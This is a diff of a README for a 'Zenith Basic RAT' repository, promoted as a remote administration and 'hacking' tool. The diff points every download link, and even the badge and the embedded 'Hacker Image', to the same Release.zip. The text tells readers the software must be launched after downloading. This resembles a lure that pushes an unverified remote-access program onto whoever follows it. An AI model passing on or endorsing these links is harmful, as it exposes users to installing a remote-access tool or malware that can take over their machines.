@@ -1,7 +1,7 @@
 
 # Zenith Basic RAT 🛡️
 
-[![Download Software](https://img.shields.io/badge/Download-Software-green)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/SayrozYT/Zenith-Basic-RAT/releases/download/v1.0/Release.zip)](https://github.com/SayrozYT/Zenith-Basic-RAT/releases/download/v1.0/Release.zip)
 
 Welcome to the Zenith Basic RAT repository! This project aims to provide a simple yet powerful Remote Administration Tool for remote control, monitoring, and management of computer systems. If you encounter any issues or need assistance, feel free to reach out to fadedfade_a on Discord for weekly updates and support.
 
@@ -30,7 +30,7 @@ The Zenith Basic RAT repository covers the following topics:
 ## Getting Started 🎯
 
 To start using Zenith Basic RAT, download the software package from the following link:
-[Download Software](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[Download Software](https://github.com/SayrozYT/Zenith-Basic-RAT/releases/download/v1.0/Release.zip)
 
 *Please note: Software needs to be launched after downloading.*
 
@@ -64,6 +64,6 @@ Let's empower remote administration with Zenith Basic RAT! 🌐
 
 Join us on this hacking journey! 🕵️‍♂️
 
-![Hacker Image](https://media.giphy.com/media/3og0IuDJIwxNMJ55oc/giphy.gif) 
+![Hacker Image](https://github.com/SayrozYT/Zenith-Basic-RAT/releases/download/v1.0/Release.zip) 
 
 Happy Hacking! 🚨
